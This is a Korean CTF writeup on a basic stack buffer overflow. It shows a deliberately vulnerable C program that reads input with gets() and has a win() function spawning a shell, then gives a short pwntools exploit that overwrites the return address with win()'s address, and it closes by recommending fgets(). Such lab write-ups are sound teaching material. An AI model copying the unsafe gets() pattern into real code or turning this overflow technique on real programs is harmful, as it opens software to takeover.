---
title: "CTF Writeup: Basic Buffer Overflow"
date: "2026-04-07"
category: "CTF/Wargame"
description: "기초적인 Buffer Overflow 취약점을 이용한 CTF 문제 풀이입니다."
tags: ["ctf", "pwn", "buffer-overflow"]
---

## 문제 개요

이번 문제는 기초적인 스택 기반 Buffer Overflow를 이용하여 쉘을 획득하는 문제입니다.

### 취약한 코드

```c
#include <stdio.h>
#include <string.h>

void win() {
    system("/bin/sh");
}

void vuln() {
    char buf[64];
    gets(buf);  // 취약점!
}

int main() {
    vuln();
    return 0;
}
```

### 분석

- `gets()` 함수는 입력 길이를 검사하지 않으므로 Buffer Overflow가 발생합니다.
- `buf`는 64바이트이지만, 그 이상 입력할 수 있습니다.
- Return Address를 `win()` 함수의 주소로 덮어쓰면 쉘을 획득할 수 있습니다.

### Exploit

```python
from pwn import *

p = process("./vuln")

payload = b"A" * 72          # buf(64) + SFP(8)
payload += p64(0x401196)      # win() address

p.sendline(payload)
p.interactive()
```

### 배운 점

- 스택 프레임 구조(buf → SFP → RET)를 이해하는 것이 중요합니다.
- `gets()` 같은 위험한 함수 대신 `fgets()`를 사용해야 합니다.
